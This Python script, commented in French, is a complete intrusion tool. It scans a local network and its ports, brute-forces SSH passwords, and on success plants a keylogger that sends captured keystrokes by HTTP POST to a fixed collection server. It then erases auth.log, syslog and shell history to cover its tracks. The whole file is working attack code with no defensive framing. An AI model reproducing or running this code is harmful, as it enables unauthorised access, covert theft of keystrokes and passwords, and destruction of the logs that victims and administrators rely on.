import paramiko
import socket
import time
import threading
import os
import platform
import subprocess

# Scan du réseau pour trouver les adresses IP actives
def ping_ip(ip):
    param = '-n' if platform.system().lower() == 'windows' else '-c'
    command = ['ping', param, '1', ip]
    return subprocess.call(command) == 0

def scan_network(base_ip):
    active_ips = []
    for i in range(58, 60):
        ip = f"{base_ip}.{i}"
        if ping_ip(ip):
            active_ips.append(ip)
    return active_ips

# Scan des ports
def scan_port(ip, port, open_ports):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((ip, port))
    if result == 0:
        open_ports.append(port)
    sock.close()

def scan_ports_fast(ip, port_range):
    open_ports = []
    threads = []
    start_time = time.time()
    
    for port in range(port_range):
        thread = threading.Thread(target=scan_port, args=(ip, port, open_ports))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    end_time = time.time()
    scan_duration = end_time - start_time

    return open_ports, scan_duration

# Exploitation par force brute SSH
def ssh_brute_force(target_ip, username, password_list_file):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    with open(password_list_file, 'r') as file:
        passwords = file.readlines()
    
    for password in passwords:
        password = password.strip()
        print(f"Trying: {username}:{password}")
        try:
            ssh.connect(target_ip, username=username, password=password)
            print(f"Success: {username}:{password}")
            
            # Injecter le keylogger
            inject_keylogger(ssh)
            
            # Supprimer les traces
            clear_logs(ssh)
            
            ssh.close()
            return True
        except paramiko.AuthenticationException:
            print(f"Failed: {username}:{password}")
        except Exception as e:
            print(f"Error: {str(e)}")
    
    return False

# Injection du keylogger
def inject_keylogger(ssh):
    keylogger_code = """
import pynput.keyboard
import requests
import threading
import time

log = ""
server_url = "http://192.168.1.118:5000/log"

def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        log += " " + str(key) + " "

def send_log():
    global log
    while True:
        if log:
            requests.post(server_url, data={"log": log})
            log = ""
        time.sleep(5)  # Attendre 5 secondes avant d'envoyer les logs à nouveau

def start():
    keyboard_listener = pynput.keyboard.Listener(on_press=on_press)
    with keyboard_listener:
        # Démarrer le thread d'envoi de logs
        send_log_thread = threading.Thread(target=send_log)
        send_log_thread.daemon = True
        send_log_thread.start()

        # Démarrer l'écouteur de clavier
        keyboard_listener.join()

if __name__ == "__main__":
    start()

"""

    sftp = ssh.open_sftp()
    sftp.file('keylogger.py', 'w').write(keylogger_code)
    sftp.close()
    ssh.exec_command('chmod 777 keylogger.py')
    ssh.exec_command('chmod +x keylogger.py')
    ssh.exec_command('sh -c "nohup python keylogger.py &')

# Suppression des traces    
def clear_logs(ssh):    
    commands = [
        'sudo sh -c \'echo "" > /var/log/auth.log\'',
        'sudo sh -c \'echo "" > /var/log/syslog\'',
        'history -c'
    ]
    for command in commands:
        ssh.exec_command(command)
        time.sleep(1)  # Attendre un peu entre les commandes

# Main
if __name__ == "__main__":
    # Scan du réseau
    base_ip = '192.168.1'  # Changez ceci selon votre réseau
    active_ips = scan_network(base_ip)
    print("Active IPs in network:")
    for ip in active_ips:
        print(ip)

    # Scan des ports
    ip = input("Enter the IP address to scan: ")
    port_range = int(input("Enter the number of ports to scan: "))
    open_ports, scan_duration = scan_ports_fast(ip, port_range)
    print(f"Open ports: {open_ports}")
    print(f"Time taken for the scan: {scan_duration} seconds")

    # Exploitation par force brute
    target_ip = ip  # Utiliser l'adresse IP scannée
    username = 'kali'  # Changez par le nom d'utilisateur cible
    password_list_file = 'password_list.txt'  # Changez par le chemin de votre fichier de mots de passe

    if ssh_brute_force(target_ip, username, password_list_file):
        print("Brute force réussie.")
    else:
        print("Brute force échouée.")
